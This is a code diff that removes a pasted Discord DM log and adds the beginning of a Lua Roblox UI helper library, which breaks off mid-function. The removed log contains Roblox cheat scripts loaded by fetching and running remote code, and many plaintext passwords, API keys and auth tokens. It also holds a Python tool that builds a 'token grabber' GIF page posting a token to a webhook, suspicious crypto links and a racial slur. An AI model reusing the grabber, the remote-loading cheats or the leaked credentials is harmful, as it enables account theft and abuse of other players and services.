@@ -1,1418 +1,367 @@
-shadow™
-sokashadow
-Roblox
-+1
+local SokaHubUI = {}
 
-shadow™ — 1/21/2025 2:13 AM
-Image
-shadow™ — 1/21/2025 11:26 AM
-Image
-shadow™ — 1/21/2025 2:28 PM
-Image
-shadow™ — 1/21/2025 8:02 PM
-Image
-shadow™ — 1/23/2025 10:13 AM
-rUwJDX4z7cHzvgM!
-shadow™ — 1/23/2025 10:20 AM
-dajijwa8!*!H!A
-shadow™ — 1/25/2025 10:03 AM
-i can only trust few
-shadow™ — 1/25/2025 4:57 PM
-aKWQA9Thj5yuS3H!!Z!
-shadow™ — 1/26/2025 5:07 PM
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Yv50/Arox-v2/refs/heads/main/Arox%20v2-obfuscated.lua"))()
-Image
-shadow™ — 1/28/2025 11:25 PM
-Image
-shadow™ — 1/31/2025 3:54 PM
-Image
-Image
-shadow™ — 2/6/2025 7:16 AM
-wealllovekingsoka!#@41
-shadow™ — 2/8/2025 6:36 PM
-Image
-shadow™
- started a call that lasted 3 minutes. — 2/9/2025 1:43 AM
-shadow™
- started a call that lasted 10 minutes. — 2/9/2025 1:46 AM
-shadow™ — 2/10/2025 2:00 AM
-Image
-shadow™ — 2/12/2025 2:19 AM
-Image
-Image
-Image
-shadow™ — 2/12/2025 2:36 AM
-1
-shadow™ — 2/17/2025 7:05 AM
-Image
-Image
-shadow™ — 2/17/2025 7:51 AM
-Image
-shadow™ — 2/18/2025 10:03 AM
-n o moew
-shadow™ — 2/18/2025 3:26 PM
-Image
-shadow™ — 2/19/2025 1:01 PM
-abddP3Xv5LiuAXN!!
-shadow™ — 2/20/2025 3:12 PM
-https://discord.gg/3GAXHSZJ
-shadow™ — 2/20/2025 3:42 PM
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Soka Hub", "DarkTheme")
+SokaHubUI.Configs = {}
+SokaHubUI.ActiveKeybinds = SokaHubUI.ActiveKeybinds or {}
 
--- Proper Unload Function
-Window.DestroyCallback = function()
-    -- Reset all states
-Expand
-message.txt
-14 KB
-shadow™ — 2/21/2025 1:27 PM
-Image
-shadow™ — 2/23/2025 2:21 PM
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Soka Hub", "DarkTheme")
-
--- Create all tabs first
-local MainTab = Window:NewTab("Main")
-local VisualTab = Window:NewTab("Visual")
-Expand
-message.txt
-16 KB
-shadow™ — 2/25/2025 4:08 PM
-Grcwcc8aNPfimPK!!
-shadow™ — 2/25/2025 4:50 PM
-Image
-KOZLVL6RV2MO3AUD
-shadow™ — 2/25/2025 5:36 PM
-yh4p4rgS5kGzWbM
-shadow™ — 2/26/2025 7:09 PM
-Image
-shadow™ — 2/26/2025 9:18 PM
-Image
-shadow™ — 3/4/2025 1:52 AM
-Image
-shadow™ — 3/5/2025 9:29 PM
-915
-3
-21
-25
-90
-shadow™ — 3/8/2025 7:39 AM
-87B8wwNHUdJiYqz
-shadow™ — 3/8/2025 10:38 AM
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Soka Hub", "DarkTheme")
-
--- Services
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
+local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 
--- Global table for all connections
-local connections = {}
+-- Helper color functions
+local function Color3ToHex(color)
+    local r = math.floor(color.R * 255)
+    local g = math.floor(color.G * 255)
+    local b = math.floor(color.B * 255)
+    return string.format("%02X%02X%02X", r, g, b)
+end
 
--- States
-local FlightEnabled = false
-local SpeedEnabled = false
-local NoClipEnabled = false
-local TargetSpeed = 1         -- Default horizontal speed from slider (change as needed)
-local FlightSpeed = 50
-local DashSpeed = 100
-local DashCooldown = false
-local RunESPUpdate = true
-local NameESP = {}
-local CustomHighlights = {}
-local CustomESPColor = Color3.new(1, 0, 0)
+local function HexToColor3(hex)
+    hex = hex:gsub("#", "")
+    local r = tonumber(hex:sub(1, 2), 16) / 255
+    local g = tonumber(hex:sub(3, 4), 16) / 255
+    local b = tonumber(hex:sub(5, 6), 16) / 255
+    return Color3.new(r, g, b)
+end
 
--- Main Tab
-local MainTab = Window:NewTab("Main")
-local SpeedSection = MainTab:NewSection("Speed")
-local FlightSection = MainTab:NewSection("Flight")
-local DashSection = MainTab:NewSection("Dash")
-local MiscSection = MainTab:NewSection("Misc")
-
--- Speed Toggle with smooth horizontal velocity update (preserves vertical velocity)
-SpeedSection:NewKeybind("Speed Toggle", "Toggle speed with key", Enum.KeyCode.X, function()
-    SpeedEnabled = not SpeedEnabled
-    if SpeedEnabled then
-        local speedConnection = RunService.Heartbeat:Connect(function()
-            if LocalPlayer.Character and SpeedEnabled then
-                local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-                if hrp and humanoid then
-                    local moveDir = humanoid.MoveDirection
-                    local currentVel = hrp.Velocity
-                    local desiredVel = Vector3.new(moveDir.X * TargetSpeed, currentVel.Y, moveDir.Z * TargetSpeed)
-                    hrp.Velocity = currentVel:Lerp(desiredVel, 0.2)
-                end
-            end
-        end)
-        table.insert(connections, speedConnection)
+-- Utility function to create instances
+local function Create(instance, properties)
+    local obj = Instance.new(instance)
+    for i, v in pairs(properties or {}) do
+        obj[i] = v
     end
-end)
+    return obj
+end
 
-SpeedSection:NewSlider("Speed Value", "Adjust speed value", 200, 1, function(value)
-    TargetSpeed = value
-end, 1)
+-- Apply hover animation to a TextButton
+local function applyHoverAnimation(button)
+    if not button:IsA("TextButton") then return end
+    local originalColor = button.BackgroundColor3
+    local hoverColor = originalColor:lerp(Color3.new(1, 1, 1), 0.1)
+    local tweenInfo = TweenInfo.new(0.15)
 
--- Flight Toggle with smooth interpolation
-FlightSection:NewKeybind("Flight Toggle", "Toggle flight with key", Enum.KeyCode.F, function()
-    FlightEnabled = not FlightEnabled
-    if FlightEnabled then
-        local char = LocalPlayer.Character
-        if char then
-            local humanoid = char:WaitForChild("Humanoid")
-            local hrp = char:WaitForChild("HumanoidRootPart")
-            local flightConn = RunService.RenderStepped:Connect(function()
-                if FlightEnabled then
-                    local desiredVel = Vector3.new(0, 0, 0)
-                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
-                        desiredVel = desiredVel + (Camera.CFrame.LookVector * FlightSpeed)
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, tweenInfo, { BackgroundColor3 = hoverColor }):Play()
+    end)
+
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, tweenInfo, { BackgroundColor3 = originalColor }):Play()
+    end)
+end
+
+-- Make a frame draggable
+local function MakeDraggable(dragArea, frame)
+    local dragging = false
+    local dragStart, startPos
+
+    dragArea.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+
+            local conn
+            conn = input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                    if conn then
+                        conn:Disconnect()
                     end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
-                        desiredVel = desiredVel - (Camera.CFrame.LookVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
-                        desiredVel = desiredVel + (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
-                        desiredVel = desiredVel - (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
-                        desiredVel = desiredVel + Vector3.new(0, FlightSpeed, 0)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
-                        desiredVel = desiredVel - Vector3.new(0, FlightSpeed, 0)
-                    end
-                    hrp.Velocity = hrp.Velocity:Lerp(desiredVel, 0.1)
                 end
             end)
-            table.insert(connections, flightConn)
         end
-    end
-end)
-
-FlightSection:NewSlider("Flight Speed", "Adjust flight speed", 200, 1, function(value)
-    FlightSpeed = value
-end)
-
--- Clean NoClip toggle using BindToRenderStep and UnbindFromRenderStep for a single connection
-MiscSection:NewToggle("NoClip", "Phase through objects", function(state)
-... (269 lines left)
-Collapse
-message.txt
-14 KB
-shadow™ — 3/8/2025 11:07 AM
-https://raw.githubusercontent.com/sokashadow/sokahub/main/mainscript
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sokashadow/sokahub/main/mainscript"))()
-shadow™ — 3/9/2025 12:34 AM
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/sokashadow/soka_hub_library/refs/heads/main/main_library"))()
-https://raw.githubusercontent.com/sokashadow/soka_hub_library/refs/heads/main/main_library
-shadow™ — 3/12/2025 5:24 AM
-local url = "https://raw.githubusercontent.com/sokashadow/soka_hub_library/main/main_library?t=" .. os.time()
-local response = game:HttpGet(url)
-local success, SokaUI = pcall(function() return loadstring(response)() end)
-
-if not success or not SokaUI then
-    error("Failed to load Soka UI Library: " .. tostring(SokaUI))
-end
-
-local Window = SokaUI:CreateWindow("Soka Hub", "DarkTheme")
-if not Window then
-    error("Failed to create Window from Soka UI Library")
-end
-
--- Services
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-local UserInputService = game:GetService("UserInputService")
-
--- Global table for all connections
-local connections = {}
-
--- States
-local FlightEnabled = false
-local SpeedEnabled = false
-local NoClipEnabled = false
-local TargetSpeed = 1           -- Default horizontal speed from slider
-local FlightSpeed = 50
-local DashSpeed = 100
-local DashCooldown = false
-local RunESPUpdate = true
-local NameESP = {}
-local CustomHighlights = {}
-local CustomESPColor = Color3.new(1, 0, 0)
-
--------------------------------------------------------
--- Main Tab (Flight, Speed, NoClip, Dash)
--------------------------------------------------------
-local MainTab = Window:CreateTab("Main")
-
--- Speed Section
-local SpeedSection = MainTab:CreateSection("Speed")
-
-SpeedSection:NewKeybind("Speed Toggle", "Toggle speed with key", Enum.KeyCode.X, function()
-    SpeedEnabled = not SpeedEnabled
-    if SpeedEnabled then
-        local speedConnection = RunService.Heartbeat:Connect(function()
-            if LocalPlayer.Character and SpeedEnabled then
-                local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
-                if hrp and humanoid then
-                    local moveDir = humanoid.MoveDirection
-                    local currentVel = hrp.Velocity
-                    local desiredVel = Vector3.new(moveDir.X * TargetSpeed, currentVel.Y, moveDir.Z * TargetSpeed)
-                    hrp.Velocity = currentVel:Lerp(desiredVel, 0.2)
-                end
-            end
-        end)
-        table.insert(connections, speedConnection)
-    end
-end)
-
-SpeedSection:NewSlider("Speed Value", "Adjust speed value", 500, 1, function(value)
-    TargetSpeed = value
-end, 1)
-
--- Flight Section
-local FlightSection = MainTab:CreateSection("Flight")
-
-FlightSection:NewKeybind("Flight Toggle", "Toggle flight with key", Enum.KeyCode.F, function()
-    FlightEnabled = not FlightEnabled
-    if FlightEnabled then
-        local char = LocalPlayer.Character
-        if char then
-            local humanoid = char:WaitForChild("Humanoid")
-            local hrp = char:WaitForChild("HumanoidRootPart")
-            local flightConn = RunService.RenderStepped:Connect(function()
-                if FlightEnabled then
-                    local desiredVel = Vector3.new(0, 0, 0)
-                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
-                        desiredVel = desiredVel + (Camera.CFrame.LookVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
-                        desiredVel = desiredVel - (Camera.CFrame.LookVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
-                        desiredVel = desiredVel + (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
-                        desiredVel = desiredVel - (Camera.CFrame.RightVector * FlightSpeed)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
-                        desiredVel = desiredVel + Vector3.new(0, FlightSpeed, 0)
-                    end
-                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
-                        desiredVel = desiredVel - Vector3.new(0, FlightSpeed, 0)
-                    end
-                    hrp.Velocity = hrp.Velocity:Lerp(desiredVel, 0.1)
-                end
-... (334 lines left)
-Collapse
-message.txt
-18 KB
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sokashadow/sokahub/main/mainscript"))()
-shadow™ — 3/21/2025 12:25 AM
-shadow™ — 3/24/2025 6:45 AM
-shadow™
- started a call that lasted 3 minutes. — 4/5/2025 11:47 PM
-shadow™
- started a call that lasted 3 minutes. — 4/5/2025 11:53 PM
-shadow™
- started a call that lasted a minute. — 4/5/2025 11:57 PM
-shadow™ — 4/6/2025 12:21 AM
-sokamayshinehislight
-zantos12!!Y
-shadow™ — 4/6/2025 2:51 PM
-Image
-shadow™
- started a call that lasted 3 minutes. — 4/9/2025 3:40 PM
-shadow™
- started a call that lasted 6 minutes. — 4/9/2025 3:43 PM
-You missed a call from 
-shadow (sub version)
- that lasted a few seconds. — 4/9/2025 10:17 PM
-You missed a call from 
-shadow (sub version)
- that lasted a minute. — 4/10/2025 3:46 PM
-You missed a call from 
-shadow (sub version)
- that lasted a minute. — 4/10/2025 3:49 PM
-You missed a call from 
-shadow (sub version)
-. — 4/10/2025 6:39 PM
-You missed a call from 
-shadow (sub version)
- that lasted a minute. — 4/10/2025 6:39 PM
-shadow™
- started a call that lasted 3 minutes. — 4/10/2025 8:15 PM
-shadow™
- started a call that lasted a few seconds. — 4/10/2025 8:18 PM
-shadow™
- started a call that lasted 3 minutes. — 4/10/2025 8:32 PM
-shadow™
- started a call that lasted 3 minutes. — 4/11/2025 4:54 PM
-shadow (sub version)
- started a call that lasted a few seconds. — 4/11/2025 5:15 PM
-shadow™ — 4/12/2025 5:16 PM
-7NezwuGazWhx8LZ
-shadow™ — 4/12/2025 6:45 PM
-Image
-shadow™ — 4/13/2025 2:47 AM
-Image
-You missed a call from 
-shadow (sub version)
- that lasted a minute. — 4/14/2025 1:02 AM
-shadow™ — 4/15/2025 2:49 AM
-5a813071-a126-4b7c-bf9a-f55f2883b782
-You missed a call from 
-shadow (sub version)
- that lasted 2 minutes. — 4/17/2025 12:29 AM
-shadow™
- started a call that lasted a few seconds. — 4/19/2025 11:07 PM
-shadow™ — 4/20/2025 12:10 AM
-#Y&AVK5t.MjUnfv
-shadow™ — 4/20/2025 8:36 PM
-You missed a call from 
-shadow (sub version)
- that lasted 3 minutes. — 4/23/2025 2:29 AM
-You missed a call from 
-shadow (sub version)
- that lasted 3 minutes. — 4/23/2025 2:34 AM
-shadow™
- started a call that lasted a few seconds. — 4/30/2025 2:10 PM
-shadow™ — 5/3/2025 11:00 AM
-Image
-Image
-You missed a call from 
-shadow (sub version)
- that lasted 3 minutes. — 5/3/2025 12:27 PM
-You missed a call from 
-shadow (sub version)
- that lasted 3 minutes. — 5/3/2025 12:31 PM
-shadow™ — 5/3/2025 2:48 PM
-K0000000000000000000000000000Ilovegooning21512!!!@#U$*!@HU(BD!(B(AHSUDAdjjd
-Ilovegooning21512!!!@#U$*!@HU(BD!(B(AHSUDAdjjd
-this is twitch password Ilovegooning21512!!!@#U$*!@HU(BD!(B(AHSUDAdjjd
-shadow™
- started a call that lasted a few seconds. — 5/5/2025 3:47 PM
-shadow™ — 5/7/2025 6:37 AM
-u
-shadow (sub version) — 5/8/2025 1:14 AM
-https://discord.gg/eFpW2vtP
-shadow™ — 5/8/2025 3:19 PM
-we can have under mods and tehy will pick who they will be their mod or we can have a woman of the day
-shadow™ — 5/8/2025 11:24 PM
-Image
-shadow™ — 5/9/2025 8:41 AM
-Image
-002v22
-shadow™ — 5/9/2025 10:22 AM
-#Y&AVK5t.MjUnfv
-howdididothat!!
-howdididothat!!]
-shadow™ — 5/9/2025 1:06 PM
-Image
-shadow™ — 5/9/2025 2:00 PM
-thisisthepasswordma11!
-You missed a call from 
-shadow (sub version)
- that lasted 3 minutes. — 5/10/2025 8:36 AM
-You missed a call from 
-shadow (sub version)
- that lasted 2 minutes. — 5/10/2025 8:45 AM
-You missed a call from 
-shadow (sub version)
- that lasted a few seconds. — 5/10/2025 8:47 AM
-shadow (sub version) — 5/14/2025 10:43 PM
-Image
-shadow™ — 5/25/2025 11:27 AM
-androstadienone Oxytocin   Androstenol  Copulins
-shadow™ — 5/26/2025 6:04 PM
-Image
-shadow™
- pinned a message to this channel. See all pinned messages. — 5/26/2025 6:35 PM
-shadow™ — 5/26/2025 6:37 PM
-Image
-Image
-shadow™ — 5/30/2025 1:54 PM
-Image
-Image
-shadow™ — 6/4/2025 2:15 PM
-Image
-shadow (sub version) — 6/4/2025 5:57 PM
-aphrosia
-stxrgvrl
-shadow (sub version) — 6/5/2025 9:27 PM
-https://discord.gg/NCy95p2C
-shadow™ — 6/6/2025 7:18 PM
-Image
-shadow™ — 6/6/2025 10:31 PM
-https://discord.gg/JGaZqYpfqs
-$AB💸
-$Account Bypasser💸
-2 Online
-3 Members
-Est. Jun 2025
-
-Go to Server
-shadow™ — 6/7/2025 7:18 AM
-ni desu theres two | ichi kenko hes 1 health | koko is here | osu is push | kuru is come | koko ni kite is come here | bitch ass nigga is kuso yaro | ni desu is theres two | no yo ni is like \ damare kuso yaro is shut up bitch ass nigga | anata no o shiri is your ass | im him is watashi wa karedesu | kare wa hibiwareta hes cracked |
-shadow™ — 6/9/2025 5:09 AM
-microsoft
-ienaea29J!(!JDaa!
-shadow™ — 6/13/2025 4:29 AM
-Image
-shadow™ — 6/13/2025 12:55 PM
-https://discord.gg/j7SFA4wwYg
-dont join this server
-dont join this server
-1 Online
-2 Members
-Est. Dec 2024
-
-Go to Server
-shadow (sub version) — 6/13/2025 2:18 PM
-https://discord.gg/jNUxcHJP
-shadow™ — 6/15/2025 6:47 PM
-Image
-shadow™ — 6/16/2025 6:42 AM
-sokashadowissupercool!!2141
-shadow™ — 6/17/2025 2:25 PM
-Image
-shadow™ — 6/23/2025 6:20 PM
-iwanttoknowwhymypcisbannedtax@gmail.com
-shadow™ — 6/28/2025 4:42 PM
-https://discord.gift/NsmGzyxmqYHTfTcz
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-shadow™ — 7/3/2025 2:01 AM
-Image
-Image
-shadow™ — 7/3/2025 8:28 PM
-Image
-shadow™ — 7/10/2025 5:51 PM
-shadow™ — 7/10/2025 5:59 PM
-https://crypto-o.click/IQ2DEX
-Tenor
-ratboythereal1
-Middle Click This Meme - Middle click this - Discover & Share GIFs
-https://crypto-o.click/IQ2DEX.gif
-Tenor
-ratboythereal1
-Middle Click This Meme - Middle click this - Discover & Share GIFs
-https://pichost.pics/IQ2DEX.gif
-Tenor
-ratboythereal1
-Middle Click This Meme - Middle click this - Discover & Share GIFs
-shadow™ — 7/10/2025 6:21 PM
-def build_fake_grabber(gif_url: str, output_filename: str = "malicious_gif.html"):
-    html_template = f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Funny GIF</title>
-    </head>
-    <body>
-        <img src="{gif_url}" alt="funny gif" style="width:400px;"><br>
-        <script>
-            // Simulated token grabber — educational only
-            const fakeToken = "abc123.fake.token.testing.only";
-
-            console.log("Simulated token:", fakeToken);
-
-            // Send to dummy webhook (for demo)
-            fetch("https://webhook.site/your-dummy-url", {{
-                method: "POST",
-                headers: {{
-                    "Content-Type": "application/json"
-                }},
-                body: JSON.stringify({{
-                    content: "FAKE TOKEN: " + fakeToken
-                }})
-            }});
-        </script>
-    </body>
-    </html>
-    """
-
-    with open(output_filename, "w", encoding="utf-8") as f:
-        f.write(html_template)
-
-    print(f"[+] Fake grabber created: {output_filename}")
-    print("⚠️ Open in browser to simulate how token-stealing GIFs work.")
-    print("🧪 Use https://webhook.site/ to create your own dummy test URL.")
-
-Example usage
-gif = input("Enter GIF URL: ")
-build_fake_grabber(gif)
-Webhook.site - Test, transform and automate Web requests and emails
-Instantly generate a free, unique URL and email address to test, inspect, and automate (with a visual workflow editor and scripts) incoming HTTP requests and emails
-import tkinter as tk
-from tkinter import messagebox
-import os
-
-def build_fake_grabber(gif_url: str, webhook_url: str, output_filename: str = "malicious_gif.html"):
-    html_template = f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Funny GIF</title>
-    </head>
-    <body style="background-color: #111; color: white; font-family: monospace;">
-        <h3>Loading...</h3>
-        <img src="{gif_url}" alt="funny gif" style="width:400px;"><br>
-        <p>This file simulates how token grabber GIFs work. For educational use only.</p>
-        <script>
-            // Simulated token grabber — for testing purposes only
-            const fakeToken = "abc123.fake.token.testing.only";
-
-            console.log("Simulated token:", fakeToken);
-
-            fetch("{webhook_url}", {{
-                method: "POST",
-                headers: {{
-                    "Content-Type": "application/json"
-                }},
-                body: JSON.stringify({{
-                    content: "FAKE TOKEN: " + fakeToken
-                }})
-            }});
-        </script>
-    </body>
-    </html>
-    """
-
-    with open(output_filename, "w", encoding="utf-8") as f:
-        f.write(html_template)
-
-    return output_filename
-
-GUI function
-def generate_grabber():
-    gif_url = gif_entry.get().strip()
-    webhook_url = webhook_entry.get().strip()
-
-    if not gif_url or not webhook_url:
-        messagebox.showerror("Input Error", "Please enter both the GIF URL and Webhook URL.")
-        return
-
-    output_file = build_fake_grabber(gif_url, webhook_url)
-    messagebox.showinfo("Success", f"Fake grabber created:\n{output_file}")
-    os.startfile(output_file)  # Optional: opens the file immediately
-
-GUI setup
-window = tk.Tk()
-window.title("GIF Token Grabber (Educational Only)")
-window.geometry("480x250")
-window.configure(bg="#222")
-
-title_label = tk.Label(window, text="GIF Grabber Builder", font=("Arial", 16, "bold"), bg="#222", fg="white")
-title_label.pack(pady=10)
-
-gif_label = tk.Label(window, text="GIF URL:", bg="#222", fg="white")
-gif_label.pack()
-gif_entry = tk.Entry(window, width=50)
-gif_entry.pack(pady=5)
-
-webhook_label = tk.Label(window, text="Webhook URL (use webhook.site):", bg="#222", fg="white")
-webhook_label.pack()
-webhook_entry = tk.Entry(window, width=50)
-webhook_entry.pack(pady=5)
-
-generate_button = tk.Button(window, text="Build Fake Grabber", command=generate_grabber, bg="#444", fg="white")
-generate_button.pack(pady=15)
-
-footer_label = tk.Label(window, text="For educational use only.", font=("Arial", 8), bg="#222", fg="#888")
-footer_label.pack(side="bottom", pady=10)
-
-window.mainloop()
-shadow™ — 7/10/2025 7:19 PM
-Image
-shadow™ — 7/13/2025 4:19 AM
-Image
-shadow™ — 7/13/2025 10:22 AM
-https://discord.gg/XEd9VXur
-shadow™ — 7/14/2025 3:50 AM
-Image
-shadow™ — 7/16/2025 1:20 PM
-supercoolguy1234!!
-shadow™ — 7/28/2025 3:08 PM
-Image
-Image
-shadow™ — 7/30/2025 11:05 AM
-https://x.com/rottenslxt/status/1857253921569353858?s=46
-shadow™ — 8/6/2025 10:18 PM
-warp://auth/desktop_redirect?refresh_token=AMf-vBzgPV2UirdGhQGdBFA9EAAsqQr6d0cBb7VicdRvQWKrFtfN6rxrzJjHor2UKGut-nT96jxqWZvNn7ezpKL6sCNxeDMgkbptLLr1l9UkewYzaBfuAARUtCM6X6jHyT2-YuINwIrcDKCfVR8g4geLEHDVLdjVxOt9anx_c1EAGK1ufsJOYQMtmDAq15XCro7Qy33_OitnkvlP9uemgEtLPNfK1hOVv8ho06HyAxTXNuxn52bEAhc&is_onboarded=false&user_uid=nh1TOdNNWhOtqelXKQdL2ehIxuJ3&deleted_anonymous_user=false&state=
-https://astral-field-294621.firebaseapp.com/__/auth/action?apiKey=AIzaSyBdy3O3S9hrdayLJxJ7mriBR4qgUaUygAs&mode=signIn&oobCode=gHJCpDzkV5NSWOJe_GIJeApjaLqPrMuI5NYj8Ggq7cUAAAGYglQmPg&continueUrl=https://app.warp.dev/signup/remote?scheme%3Dwarp%26state%3D8b2ad969-4649-4991-8721-54de15719f20%26public_beta%3Dtrue&lang=en
-shadow™ — 8/7/2025 10:19 AM
-https://astral-field-294621.firebaseapp.com/__/auth/action?apiKey=AIzaSyBdy3O3S9hrdayLJxJ7mriBR4qgUaUygAs&mode=signIn&oobCode=ODRhombbs9e4On5pREiWmmW_SByDAb31ewI6mHLNK2AAAAGYhONLrA&continueUrl=https://app.warp.dev/link_anonymous_user&lang=en
-shadow™ — 8/8/2025 11:58 PM
-sokashadowiscooked
-shadow™ — 8/9/2025 10:04 PM
-Pryominium
-#GGEZ
-shadow™ — 8/12/2025 9:09 AM
-6WAR4ZEUED1X6XYM
-shadow (sub version) — 8/13/2025 5:23 AM
-https://discord.gg/5knXHuYg
-shadow™ — 8/13/2025 6:29 AM
-Image
-shadow™ — 8/22/2025 10:30 PM
-9ddQT1
-shadow™ — 8/25/2025 3:17 PM
-Image
-shadow™ — 8/26/2025 1:21 AM
-tall really awesome and famous™
-need gbf to make gf jealous cool
-shadow™ — 8/27/2025 1:52 AM
-ilovewomenSIKEEEEILIED1234431!!
-womenhatealtacc12341
-shadow™ — 8/27/2025 9:37 PM
-lami
-shadow™
- started a call that lasted 3 minutes. — 8/29/2025 10:04 PM
-shadow (sub version)
- started a call that lasted 7 minutes. — 8/29/2025 10:08 PM
-shadow™
- started a call that lasted 3 minutes. — 8/29/2025 10:14 PM
-shadow™
- started a call that lasted 4 minutes. — 8/29/2025 10:22 PM
-shadow (sub version) — 8/29/2025 10:40 PM
-shadow™
- started a call that lasted a few seconds. — 8/31/2025 8:00 AM
-shadow™ — 9/12/2025 7:30 PM
-Goonfemboys123!!
-shadow™ — 9/13/2025 3:10 PM
-https://discord.gift/-3P35EBQ1F9WCC92F
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-https://discord.gift/TEST-D0STJ9RDNTJQIDX4
-https://discord.gift/TEST-U80KVZJRQVHPBDXZ
-https://discord.gift/TEST-IS1YIZARA400PVH6
-https://discord.gift/TEST-1HFVWUQB7YD2PE7V
-https://discord.gift/TEST-L6A7J3HMT02FYQ6Y
-https://discord.gift/TEST-G5KVJFRW0H43C9UC
-https://discord.gift/TEST-WA3PHHRC81PII0P2
-https://discord.gift/TEST-HL3PLBQBMC1SUPXB
-https://discord.gift/TEST-66PNGT8L4DF33UOH
-https://discord.gift/TEST-P6SNDN4IN1ZXW7J2
-https://discord.gift/TEST-GP9T0W6XSPL1KMBR
-https://discord.gift/TEST-F51TKODMSKVAV0WU
-https://discord.gift/TEST-93S4VNVVX316KKMQ
-https://discord.gift/TEST-PG7WQJ5XOV5RTE9X
-https://discord.gift/TEST-KNLL6YD4SZFH37EE
-https://discord.gift/TEST-7W02M26DJYXA9UCN
-https://discord.gift/TEST-8UG4EOSDXRA843CX
-https://discord.gift/TEST-VXYTVKE2LFW801TE
-https://discord.gift/TEST-90YRZ2UUGH8YOJ50
-https://discord.gift/TEST-P2GLX9X41J0YLGZO
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-https://discord.gift/TEST-D0STJ9RDNTJQIDX4
-Discord
-Discord - Group Chat That’s All Fun & Games
-Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out.
-Discord - Group Chat That’s All Fun & Games
-https://discord.gift/PgqYXOGnoESl3uRA25Snm
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-https://discord.gift/HFGrtCd1RvLzgw8hWC
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-https://discord.gift/laVvNbqsHbJTHLNxCtz04
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-https://discord.gift/laVvNbqsHbJTHLNxCtz04
-You sent a gift, but...
-This gift link is no longer active. Don't worry—if the item is still in your inventory, you can create a new link to send again.
-
-Gift Inventory
-shadow™ — 9/26/2025 1:47 AM
-https://aniwatchtv.to/watch/masamune-kuns-revenge-4133?ep=36640
-Watch Masamune-kun's Revenge English Sub/Dub online Free on Aniwatc...
